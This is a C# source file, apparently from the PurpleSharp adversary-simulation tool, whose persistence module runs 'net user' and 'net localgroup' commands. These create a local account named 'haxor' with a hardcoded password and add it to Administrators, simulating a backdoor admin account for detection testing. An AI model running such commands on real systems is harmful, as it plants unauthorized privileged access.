using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class Persistence
    {
        public static void CreateAccountApi()
        {
            PersistenceHelper.CreateUser("test");
        }

        public static void CreateAccountCmd(string log)
        {
            ExecutionHelper.StartProcess("", "net user haxor Passw0rd123El7 /add", log);
            ExecutionHelper.StartProcess("", "net localgroup Administrators haxor /add", log);
        }
    }
}
